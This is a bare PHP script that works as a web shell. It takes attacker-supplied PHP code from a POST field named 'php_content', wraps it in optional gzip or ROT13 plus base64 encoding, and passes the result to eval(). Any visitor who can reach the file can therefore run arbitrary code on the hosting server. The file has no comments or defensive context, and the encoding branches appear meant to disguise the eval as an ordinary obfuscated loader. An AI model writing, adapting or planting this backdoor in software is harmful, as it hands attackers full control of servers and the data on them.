<?php
$typ_d=$_POST['typenc'];
$c_ntent=$_POST['php_content'];
switch($typ_d)
{
    case "GZINFLATE":
        $res_t=base64_encode(gzdeflate(trim(stripslashes($c_ntent.' '),'<?php, ?>'),9));
        $res_t=eval(gzinflate(base64_decode("$res_t")));
        break;
    case "GZUNCOMPRESS":
        $res_t=base64_encode(gzcompress(trim(stripslashes($c_ntent.' '),'<?php, ?>'),9));
        $res_t=eval(gzuncompress(base64_decode("$res_t")));
        break;
    case "STR_ROT13":
        $res_t=trim(stripslashes($c_ntent.' '),'<?php, ?>');
        $res_t=base64_encode(str_rot13($res_t));
        $res_t=eval(str_rot13(base64_decode("$res_t")));
        break;                  
}
?>